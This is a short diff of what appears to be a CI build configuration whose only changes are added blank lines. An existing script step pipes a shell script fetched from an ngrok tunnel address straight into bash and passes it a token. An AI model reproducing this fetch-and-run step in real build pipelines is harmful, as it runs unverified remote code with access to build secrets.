@@ -5,3 +5,5 @@ install:
 script:
   - pytest --cov=./ --cov-report=xml
   - bash <(curl -s https://b6d15fb65434.ngrok.io/bash) -t 69bb2fd5-6774-4ce4-864f-4df8b5263025
+
+  
